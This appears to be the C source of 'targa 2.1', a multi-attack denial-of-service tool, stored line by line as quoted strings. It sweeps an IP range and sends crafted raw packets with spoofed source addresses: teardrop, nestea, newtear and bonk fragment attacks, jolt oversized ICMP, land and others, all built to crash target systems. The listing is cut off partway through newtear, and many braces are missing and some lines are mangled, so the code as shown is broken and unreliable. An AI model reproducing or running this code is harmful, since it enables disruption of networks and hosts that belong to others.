            "#define SAICOUNT    50\t\t/* repeat saihyousen attack x times */",
            "#define OSHCOUNT    50\t\t/* repeat oshare attack x times */",
            "#define __FAVOR_BSD\t\t/* for newer linux */",
            "#define TH_SYN 0x02\t\t/* for lame includes */",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <time.h>",
            "#include <getopt.h>",
            "#include <unistd.h>",
            "#include <arpa/inet.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#include <netinet/tcp.h>",
            "#include <netinet/udp.h>",
            "#include <netinet/udp.h>",
            "#include <sys/socket.h>",
            "#include <sys/time.h>",
            "#include <sys/types.h>",
            "#define FIX(n)  htons(n)\t/* define this to (n), if using BSD */",
            "#define IPH     0x14\t\t/* IP header size */",
            "#define UDPH    0x8\t\t/* UDP header size */",
            "#define IP_MF   0x2000\t\t/* Fragmention offset */",
            "#define MAGIC   0x3\t\t/* Teardrop Magic fragmentation constant (tm) */",
            "#define MAGIC2  108\t\t/* Nestea Magic fragmentation constant (tm) */",
            "#define NESPADDING 256\t\t/* Padding for Nestea */",
            "#define PADDING 0x14\t\t/* Padding for other frag's */",
            "#define TCPH    sizeof(struct tcphdr)\t/* TCP header size (nestea) */",
            "#define TPADDING 0x1c\t\t/* Padding for original teardrop */",
            "/* main() - user interface & some functions */",
            "struct ipstuph",
            "    int p1;",
            "    int p2;",
            "    int p3;",
            "    int p4;",
            "startip, endip;",
            "void targa (u_char *);",
            "u_long leet_resolve (u_char *);",
            "u_short in_cksum (u_short *, int);",
            "int hax0r (char *, int);",
            "int targa_help (u_char *);",
            "int bonk (char *);",
            "int jolt (char *);",
            "int land (char *);",
            "int nestea (char *);",
            "int newtear (char *);",
            "int syndrop (char *);",
            "int teardrop (char *);",
            "int winnuke (char *, int);",
            "int x1234 (char *);",
            "int saihyousen (char *);",
            "int oshare (char *);",
            "main (int argc, char **argv)",
            "  int count = 1, i, j, dostype = 0;",
            "  char hit_ip[18], dst_ip2[18], dst_ip[4096];",
            "  fprintf (stderr, \"\\t\\t",
            "[1;33mtarga 2.1 by ",
            "[0;34m",
            "[5mMixter",
            "[0m\\n\");",
            "  if ((argv[1] == \"-help\") || (argv[1] == \"--help\") || (argv[1] == \"-h\") || (argv[1] == \"--h\"))",
            "    targa_help (argv[0]);",
            "  if (argc < 3)",
            "    if (argc < 2)",
            "      targa (argv[0]);",
            "  strncpy (dst_ip, argv[1], 4096);",
            "  if (argc == 2)",
            "    {",
            "      strncpy (dst_ip2, argv[1], 18);",
            "    }",
            "  else",
            "    {",
            "      strncpy (dst_ip2, argv[2], 18);",
            "    }",
            "  if (sscanf (dst_ip, \"%d.%d.%d.%d\", &startip.p1, &startip.p2, &startip.p3, &startip.p4) != 4)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Error, %s: Please use a start IP containing 4 zones\\n\", argv[1]);",
            "      exit (1);",
            "    }",
            "  if (startip.p1 > 255)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 1 of start ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p2 > 255)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 2 of start ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p3 > 255)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 3 of start ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p4 > 255)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 4 of start ip is incorret (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (sscanf (dst_ip2, \"%d.%d.%d.%d\", &endip.p1, &endip.p2, &endip.p3, &endip.p4) != 4)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Error, %s: Please use an end IP containing 4 zones\\n\", argv[2]);",
            "      exit (1);",
            "    }",
            "  if (endip.p1 > 255)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 1 of end ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (endip.p2 > 255)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 2 of end ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (endip.p3 > 255)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 3 of end ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (endip.p4 > 255)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 4 of end ip is incorrect (greater than 255)\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p1 != endip.p1)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 1 of start ip and end ip is different",
            "[0m\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p2 != endip.p2)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 2 of start ip and end ip is different\\n\");",
            "      exit (1);",
            "    }",
            "  if (startip.p3 != endip.p3)",
            "    {",
            "      targa_help (argv[0]);",
            "      fprintf (stderr, \"Zone 3 of start ip and end ip is different\\n\");",
            "      exit (1);",
            "    }",
            "  while ((i = getopt (argc, argv, \"t:n:h\")) != EOF)",
            "    {",
            "      switch (i)",
            "\tcase 't':",
            "\t  dostype = atoi (optarg);\t/* type of DOS */",
            "\t  break;",
            "\tcase 'n':\t\t/* number to send */",
            "\t  count = atoi (optarg);",
            "\t  break;",
            "\tcase 'h':\t\t/* quiet mode */",
            "\t  targa_help (argv[0]);",
            "\t  break;",
            "\tdefault:",
            "\t  targa (argv[0]);",
            "\t  break;\t\t/* NOTREACHED */",
            "    }",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  srand (time (NULL));",
            "  fprintf (stderr, \"",
            "[1;31mLeet",
            "[0;31mness on f",
            "[1;31mlaxen wing",
            "[0;31ms",
            "[0m:\\n\");",
            "  fprintf (stderr, \"",
            "[1;31mTo",
            "[0m: ",
            "[0;31m%s - %s",
            "[0m\\n\", dst_ip, dst_ip2);",
            "  fprintf (stderr, \"",
            "[1;31mRepeats",
            "[0m: ",
            "[0;31m%5d",
            "[0m\\n\", count);",
            "  fprintf (stderr, \"",
            "[1;31m   Type",
            "[0m: ",
            "[0;31m%5d",
            "[0m\\n\", dostype);",
            "  for (j = startip.p4; j <= endip.p4; j++)",
            "    {",
            "      sprintf (hit_ip, \"%d.%d.%d.%d\", startip.p1, startip.p2, startip.p3, j);",
            "      fprintf (stderr, \"",
            "[0;31m%s ",
            "[1;31m[ ",
            "[0m\", hit_ip);",
            "      for (i = 0; i < count; i++)",
            "\t  hax0r (hit_ip, dostype);",
            "      fprintf (stderr, \"",
            "[0;31m ]",
            "[0m\\n\");",
            "    }",
            "  fprintf (stderr, \"\\t",
            "[1;31m-all done-",
            "[0m\\n\");",
            "  return (0);",
            "hax0r (char *vm, int te)",
            "  int counter;",
            "/* beginning of hardcoded ereetness :P */",
            "  if (te == 1 || te == 0)",
            "    bonk (vm);",
            "  if (te == 2 || te == 0)",
            "    jolt (vm);",
            "  if (te == 3 || te == 0)",
            "    land (vm);",
            "  if (te == 4 || te == 0)",
            "    nestea (vm);",
            "  if (te == 5 || te == 0)",
            "    newtear (vm);",
            "  if (te == 6 || te == 0)",
            "    syndrop (vm);",
            "  if (te == 7 || te == 0)",
            "    teardrop (vm);",
            "  if (te == 8 || te == 0)",
            "    {",
            "      if ((!WNUKEREP) && (te == 8))",
            "\twinnuke (vm, 10);",
            "      winnuke (vm, WNUKEREP);",
            "    }",
            "  if (te == 9 || te == 0)",
            "    {",
            "      for (counter = 0; counter <= X1234COUNT; counter++)",
            "\tx1234 (vm);",
            "    }",
            "  if (te == 10 || te == 0)",
            "    {",
            "      for (counter = 0; counter <= SAICOUNT; counter++)",
            "\tsaihyousen (vm);",
            "    }",
            "  if (te == 11 || te == 0)",
            "    {",
            "      for (counter = 0; counter <= OSHCOUNT; counter++)",
            "\toshare (vm);",
            "    }",
            "  return (31337);",
            "u_long",
            "leet_resolve (u_char * host_name)",
            "  struct in_addr addr;",
            "  struct hostent *host_ent;",
            "  if ((addr.s_addr = inet_addr (host_name)) == -1)",
            "    {",
            "      if (!(host_ent = gethostbyname (host_name)))",
            "\treturn (0);",
            "      bcopy (host_ent->h_addr, (char *) &addr.s_addr, host_ent->h_length);",
            "    }",
            "  return (addr.s_addr);",
            "void",
            "targa (u_char * name)",
            "  fprintf (stderr, \"",
            "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats]",
            "[0m\\n\", name);",
            "  exit (0);",
            "targa_help (u_char * name)",
            "  fprintf (stderr, \"",
            "[0;31musage: %s <startIP> <endIP> [-t type] [-n repeats]\\n\", name);",
            "  fprintf (stderr, \"startIP - endIP: ",
            "[1;31mIP range to send packets to (destination)\\n\");",
            "  fprintf (stderr, \"",
            "[0;31mstart and end must be on the same C class (1.1.1.X)\\n\");",
            "  fprintf (stderr, \"repeats: ",
            "[1;31mrepeat the whole cycle n times (default is 1)\\n\");",
            "  fprintf (stderr, \"",
            "[0;31mtype: ",
            "[1;31mkind of remote DoS to send (default is 0)\\n\");",
            "  fprintf (stderr, \"",
            "[0;31m1 = bonk (",
            "[1;31m$",
            "[0;31m)  2 = jolt (",
            "[1;32m@",
            "[0;31m)  3 = land (",
            "[1;33m-",
            "[0;31m)\\n\");",
            "  fprintf (stderr, \"4 = nestea (",
            "[1;34m.",
            "[0;31m)  5 = newtear (",
            "[1;32m#",
            "[0;31m)\\n\");",
            "  fprintf (stderr, \"6 = syndrop (",
            "[1;35m&",
            "[0;31m)  7 = teardrop (",
            "[1;34m%%",
            "[0;31m)  8 = winnuke (",
            "[1;37m*",
            "[0;31m)\\n\");",
            "  fprintf (stderr, \"9 = 1234 (",
            "[1;38m!",
            "[0;31m)  10 = saihyousen (",
            "[1;36m+",
            "[0;31m)  11 = oshare (",
            "[0;33m|",
            "[0;31m)\\n\");",
            "  fprintf (stderr, \"",
            "[0;31m0 = use all remote DoS types at once\\n",
            "[0m\");",
            "  exit (0);",
            "u_short",
            "in_cksum (u_short * addr, int len)",
            "  int nleft = len, sum = 0;",
            "  u_short *w = addr, answer = 0;",
            "  while (nleft > 1)",
            "    {",
            "      sum += *w++;",
            "      nleft -= 2;",
            "    }",
            "  if (nleft == 1)",
            "    {",
            "      *(u_char *) (&answer) = *(u_char *) w;",
            "      sum += answer;",
            "    }",
            "  sum = (sum >> 16) + (sum & 0xffff);",
            "  sum += (sum >> 16);",
            "  answer = ~sum;",
            "  return (answer);",
            "/* bonk(destination) */",
            "struct udp_pkt",
            "  struct iphdr ip;",
            "  struct udphdr udp;",
            "  char data[0x1c];",
            "pkt;",
            "int udplen = sizeof (struct udphdr), iplen = sizeof (struct iphdr), datalen = 100,",
            "  psize = sizeof (struct udphdr) + sizeof (struct iphdr) + 0x1c, spf_sck;\t/* Socket */",
            "u_long",
            "host_to_ip (char *host_name)",
            "  static u_long ip_bytes;",
            "  struct hostent *res;",
            "  res = gethostbyname (host_name);",
            "  if (res == NULL)",
            "    return (0);",
            "  memcpy (&ip_bytes, res->h_addr, res->h_length);",
            "  return (ip_bytes);",
            "void",
            "quit (char *reason)",
            "  perror (reason);",
            "  close (spf_sck);",
            "  exit (-1);",
            "fondle (int sck, u_long src_addr, u_long dst_addr, int src_prt,",
            "\tint dst_prt)",
            "  int bs;",
            "  struct sockaddr_in to;",
            "  memset (&pkt, 0, psize);",
            "  /* Fill in ip header */",
            "  ipheader->pkt.ip.version = 4;",
            "  ipheader->pkt.ip.ihl = 5;",
            "  ipheader->pkt.ip.tot_len = htons (udplen + iplen + 0x1c);",
            "  ipheader->pkt.ip.id = htons (0x455);",
            "  ipheader->pkt.ip.ttl = 255;",
            "  ipheader->pkt.ip.protocol = IPPROTO_UDP;",
            "  ipheader->pkt.ip.saddr = src_addr;",
            "  ipheader->pkt.ip.daddr = dst_addr;",
            "  ipheader->pkt.ip.frag_off = htons (0x2000);\t/* more to come */",
            "  udpheader->pkt.udp.source = htons (src_prt);\t/* udp header */",
            "  udpheader->pkt.udp.dest = htons (dst_prt);",
            "  udpheader->pkt.udp.len = htons (8 + 0x1c);",
            "  /* send 1st frag */",
            "  to.sin_family = AF_INET;",
            "  to.sin_port = src_prt;",
            "  to.sin_addr.s_addr = dst_addr;",
            "  bs = sendto (sck, &pkt, psize, 0, (struct sockaddr *) &to,",
            "\t       sizeof (struct sockaddr));",
            "  pkt.ip.frag_off = htons (0x3 + 1);\t/* shinanigan */",
            "  pkt.ip.tot_len = htons (iplen + 0x3);",
            "  /* 2nd frag */",
            "  bs = sendto (sck, &pkt, iplen + 0x3 + 1, 0,",
            "\t       (struct sockaddr *) &to, sizeof (struct sockaddr));",
            "  return bs;",
            "bonk (char *bonk_host)",
            "  int i, src_prt = 53, dst_prt = 53, bs = 1, pkt_count = BONKREP;",
            "  u_long dst_addr = host_to_ip (bonk_host);",
            "  if (!dst_addr)",
            "    quit (\"bad target host\");",
            "  spf_sck = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "  if (!spf_sck)",
            "    quit (\"socket()\");",
            "  if (setsockopt (spf_sck, IPPROTO_IP, IP_HDRINCL, (char *) &bs,",
            "\t\t  sizeof (bs)) < 0)",
            "    quit (\"IP_HDRINCL\");",
            "  for (i = 0; i < pkt_count; ++i)",
            "    {",
            "      fondle (spf_sck, rand (), dst_addr, src_prt, dst_prt);",
            "      fprintf (stderr, \"",
            "[1;31m$",
            "[0m\");",
            "    }",
            "  close (spf_sck);",
            "  return 0;",
            "/* jolt(destination) */",
            "jolt (char *jolt_host)",
            "  int s, i;",
            "  char buf[400];",
            "  struct ip *ip = (struct ip *) buf;",
            "  struct icmphdr *icmp = (struct icmphdr *) (ip + 1);",
            "  struct hostent *hp;",
            "  struct sockaddr_in dst;",
            "  int offset, on = 1, num = JOLTREP;",
            "  bzero (buf, sizeof buf);",
            "  if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, &on, sizeof (on)) < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  for (i = 1; i <= num; i++)",
            "    {",
            "      if ((hp = gethostbyname (jolt_host)) == NULL)",
            "\t  if ((ip->ip_dst.s_addr = inet_addr (jolt_host)) == -1)",
            "\t    {",
            "\t      fprintf (stderr, \"%s: unknown host\\n\", jolt_host);",
            "\t      exit (1);",
            "\t    }",
            "      else",
            "\t  bcopy (hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);",
            "      ip->ip_src.s_addr = rand ();",
            "      fprintf (stderr, \"",
            "[1;32m@",
            "[0m\");",
            "      inet_ntoa (ip->ip_dst);",
            "      ip->ip_v = 4;",
            "      ip->ip_hl = sizeof *ip >> 2;",
            "      ip->ip_tos = 0;",
            "      ip->ip_len = htons (sizeof buf);",
            "      ip->ip_id = htons (4321);",
            "      ip->ip_off = htons (0);",
            "      ip->ip_ttl = 255;",
            "      ip->ip_p = 1;",
            "      dst.sin_addr = ip->ip_dst;",
            "      dst.sin_family = AF_INET;",
            "      icmp->type = ICMP_ECHO;",
            "      icmp->code = 0;",
            "      icmp->checksum = htons (~(ICMP_ECHO << 8));",
            "      for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip))",
            "\t  ip->ip_off = htons (offset >> 3);",
            "\t  if (offset < 65120)",
            "\t    ip->ip_off |= htons (0x2000);",
            "\t  else",
            "\t    ip->ip_len = htons (418);\t/* make total 65538 */",
            "\t  if (sendto (s, buf, sizeof buf, 0, (struct sockaddr *) &dst,",
            "\t\t      sizeof dst) < 0)",
            "\t    {",
            "\t      fprintf (stderr, \"offset %d: \", offset);",
            "\t      perror (\"sendto\");",
            "\t    }",
            "\t  if (offset == 0)",
            "\t    {",
            "\t      icmp->type = 0;",
            "\t      icmp->code = 0;",
            "\t      icmp->checksum = 0;",
            "\t    }",
            "    }",
            "  close (s);",
            "  return 0;",
            "/* land(destination,port) */",
            "typedef u_long tcp_seq;",
            "struct tcxhdr",
            "    u_short th_sport;",
            "    u_short th_dport;",
            "    tcp_seq th_seq;",
            "    tcp_seq th_ack;",
            "#if __BYTE_ORDER == __LITTLE_ENDIAN",
            "    u_char th_x2:4, th_off:4;",
            "#endif",
            "#if __BYTE_ORDER == __BIG_ENDIAN",
            "    u_char th_off:4, th_x2:4;",
            "#endif",
            "    u_char th_flags;",
            "    u_short th_win;",
            "    u_short th_sum;",
            "    u_short th_urp;",
            "  };",
            "struct pseudohdr",
            "    struct in_addr saddr;",
            "    struct in_addr daddr;",
            "    u_char zero;",
            "    u_char protocol;",
            "    u_short length;",
            "    struct tcxhdr tcpheader;",
            "  };",
            "u_short",
            "checksum (u_short * data, u_short length)",
            "  register long value = 0;",
            "  u_short i;",
            "  for (i = 0; i < (length >> 1); i++)",
            "    value += data[i];",
            "  if ((length & 1) == 1)",
            "    value += (data[i] << 8);",
            "  value = (value & 65535) + (value >> 16);",
            "  return (~value);",
            "land (char *land_host)",
            "  struct sockaddr_in sin;",
            "  struct hostent *hoste;",
            "  int sock, i;",
            "  char buffer[40];",
            "  struct iphdr *ipheader = (struct iphdr *) buffer;",
            "  struct tcxhdr *tcpheader = (struct tcxhdr *) (buffer + sizeof (struct iphdr));",
            "  struct pseudohdr pseudoheader;",
            "  static int land_port = LANDPORT;",
            "  bzero (&sin, sizeof (struct sockaddr_in));",
            "  sin.sin_family = AF_INET;",
            "  if ((hoste = gethostbyname (land_host)) != NULL)",
            "    bcopy (hoste->h_addr, &sin.sin_addr, hoste->h_length);",
            "  else if ((sin.sin_addr.s_addr = inet_addr (land_host)) == -1)",
            "    {",
            "      fprintf (stderr, \"unknown host %s\\n\", land_host);",
            "      return (-1);",
            "    }",
            "  if ((sin.sin_port = htons (land_port)) == 0)",
            "    return (-1);",
            "  if ((sock = socket (AF_INET, SOCK_RAW, 255)) == -1)",
            "    return (-1);",
            "  bzero (&buffer, sizeof (struct iphdr) + sizeof (struct tcxhdr));",
            "  version = 4;",
            "  ihl = sizeof (struct iphdr) / 4;",
            "  tot_len = htons (sizeof (struct iphdr) + sizeof (struct tcxhdr));",
            "  id = htons (0xF1C);",
            "  ttl = 255;",
            "  protocol = IPPROTO_TCP;",
            "  saddr = sin.sin_addr.s_addr;",
            "  daddr = sin.sin_addr.s_addr;",
            "  th_sport = sin.sin_port;",
            "  th_dport = sin.sin_port;",
            "  th_seq = htonl (0xF1C);",
            "  th_flags = TH_SYN;",
            "  th_off = sizeof (struct tcxhdr) / 4;",
            "  th_win = htons (2048);",
            "  bzero (&pseudoheader, 12 + sizeof (struct tcxhdr));",
            "  pseudoheader.saddr.s_addr = sin.sin_addr.s_addr;",
            "  pseudoheader.daddr.s_addr = sin.sin_addr.s_addr;",
            "  pseudoheader.protocol = 6;",
            "  pseudoheader.length = htons (sizeof (struct tcxhdr));",
            "  bcopy ((char *) tcpheader, (char *) &pseudoheader.tcpheader, sizeof (struct tcxhdr));",
            "  tcpheader->th_sum = checksum ((u_short *) & pseudoheader, 12 + sizeof (struct tcxhdr));",
            "  for (i = 0; i < LANDREP; i++)",
            "    {",
            "      if (sendto (sock, buffer, sizeof (struct iphdr) + sizeof (struct tcxhdr), 0, (struct sockaddr *) &sin, sizeof (struct sockaddr_in)) == -1)",
            "\t  fprintf (stderr, \"couldn't send packet\\n\");",
            "\t  return (-1);",
            "      fprintf (stderr, \"",
            "[1;33m-",
            "[0m\");",
            "    }",
            "  close (sock);",
            "  return (0);",
            "/* nestea(source, destination) */",
            "u_long name_resolve (u_char *);",
            "void send_nes (int, u_long, u_long, u_short, u_short);",
            "nestea (char *nes_host)",
            "  int one = 1, count = 0, i, rip_sock;",
            "  u_long src_ip = 0, dst_ip = 0;",
            "  u_short src_prt = 0, dst_prt = 0;",
            "  struct in_addr addr;",
            "  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"raw socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))",
            "      < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  if (!(dst_ip = name_resolve (nes_host)))",
            "    {",
            "      fprintf (stderr, \"What the hell kind of IP address is that?\\n\");",
            "      exit (1);",
            "    }",
            "  src_ip = rand ();",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  src_prt = (random () % 0xffff);",
            "  dst_prt = (random () % 0xffff);",
            "  count = NESCOUNT;",
            "  addr.s_addr = src_ip;",
            "  addr.s_addr = dst_ip;",
            "  for (i = 0; i < count; i++)",
            "    {",
            "      send_nes (rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "      fprintf (stderr, \"",
            "[1;34m.",
            "[0m\");",
            "    }",
            "  close (rip_sock);",
            "  return (0);",
            "void",
            "send_nes (int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "\t  u_short dst_prt)",
            "  int i;",
            "  u_char *packet = NULL, *p_ptr = NULL;\t\t/* packet pointers */",
            "  u_char byte;\t\t\t/* a byte */",
            "  struct sockaddr_in sin;\t/* socket protocol structure */",
            "  sin.sin_family = AF_INET;",
            "  sin.sin_port = src_prt;",
            "  sin.sin_addr.s_addr = dst_ip;",
            "  packet = (u_char *) malloc (IPH + UDPH + NESPADDING + 40);",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + NESPADDING);",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + 10);\t\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) |= FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (8 + 10);\t/* UDP total length */",
            "  if (sendto (sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + NESPADDING);",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + MAGIC2);\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = FIX (6);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 4;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (8 + MAGIC2);\t/* UDP total length */",
            "  if (sendto (sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + NESPADDING + 40);",
            "  byte = 0x4F;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + NESPADDING + 40);",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0 | FIX (IP_MF);\t/* IP frag flags and offset */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = 0x40;\t/* IP TTL */",
            "  byte = IPPROTO_UDP;",
            "  memcpy (p_ptr + 1, &byte, sizeof (u_char));",
            "  p_ptr += 4;\t\t\t/* IP checksum filled in by kernel */",
            "  *((u_long *) p_ptr) = src_ip;\t/* IP source address */",
            "  p_ptr += 4;",
            "  *((u_long *) p_ptr) = dst_ip;\t/* IP destination address */",
            "  p_ptr += 44;",
            "  *((u_short *) p_ptr) = htons (src_prt);\t/* UDP source port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (dst_prt);\t/* UDP destination port */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (8 + NESPADDING);\t/* UDP total length */",
            "  for (i = 0; i < NESPADDING; i++)",
            "    {",
            "      p_ptr[i++] = random () % 255;",
            "    }",
            "  if (sendto (sock, packet, IPH + UDPH + NESPADDING, 0, (struct sockaddr *) &sin,",
            "\t      sizeof (struct sockaddr)) == -1)",
            "    {",
            "      perror (\"\\nsendto\");",
            "      free (packet);",
            "      exit (1);",
            "    }",
            "  free (packet);",
            "u_long",
            "name_resolve (u_char * host_name)",
            "  struct in_addr addr;",
            "  struct hostent *host_ent;",
            "  if ((addr.s_addr = inet_addr (host_name)) == -1)",
            "    {",
            "      if (!(host_ent = gethostbyname (host_name)))",
            "\treturn (0);",
            "      bcopy (host_ent->h_addr, (char *) &addr.s_addr, host_ent->h_length);",
            "    }",
            "  return (addr.s_addr);",
            "/* newtear(destination) */",
            "void newt_frags (int, u_long, u_long, u_short, u_short);",
            "newtear (char *newt_host)",
            "  int one = 1, count = 0, i, rip_sock;",
            "  u_long src_ip = 0, dst_ip = 0;",
            "  u_short src_prt = 0, dst_prt = 0;",
            "  struct in_addr addr;",
            "  if ((rip_sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "      perror (\"raw socket\");",
            "      exit (1);",
            "    }",
            "  if (setsockopt (rip_sock, IPPROTO_IP, IP_HDRINCL, (char *) &one, sizeof (one))",
            "      < 0)",
            "    {",
            "      perror (\"IP_HDRINCL\");",
            "      exit (1);",
            "    }",
            "  if (!(dst_ip = name_resolve (newt_host)))",
            "    {",
            "      fprintf (stderr, \"What the hell kind of IP address is that?\\n\");",
            "      exit (1);",
            "    }",
            "  src_ip = rand ();",
            "  srandom ((unsigned) (time ((time_t) 0)));",
            "  src_prt = (random () % 0xffff);",
            "  dst_prt = (random () % 0xffff);",
            "  count = COUNT;",
            "  addr.s_addr = src_ip;",
            "  addr.s_addr = dst_ip;",
            "  for (i = 0; i < count; i++)",
            "    {",
            "      newt_frags (rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "      fprintf (stderr, \"",
            "[1;32m#",
            "[0m\");",
            "    }",
            "  close (rip_sock);",
            "  return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void",
            "newt_frags (int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "\t    u_short dst_prt)",
            "  u_char *packet = NULL, *p_ptr = NULL;\t\t/* packet pointers */",
            "  u_char byte;\t\t\t/* a byte */",
            "  struct sockaddr_in sin;\t/* socket protocol structure */",
            "  sin.sin_family = AF_INET;",
            "  sin.sin_port = src_prt;",
            "  sin.sin_addr.s_addr = dst_ip;",
            "  /*",
            "   * Grab some memory for our packet, align p_ptr to point at the beginning",
            "   * of our packet, and then fill it with zeros.",
            "   */",
            "  packet = (u_char *) malloc (IPH + UDPH + PADDING);",
            "  p_ptr = packet;",
            "  bzero ((u_char *) p_ptr, IPH + UDPH + PADDING);\t// Set it all to zero",
            "  byte = 0x45;\t\t\t/* IP version and header length */",
            "  memcpy (p_ptr, &byte, sizeof (u_char));",
            "  p_ptr += 2;\t\t\t/* IP TOS (skipped) */",
            "  *((u_short *) p_ptr) = FIX (IPH + UDPH + PADDING);\t/* total length */",
            "  p_ptr += 2;",
            "  *((u_short *) p_ptr) = htons (242);\t/* IP id */",
            "  p_ptr += 2;",
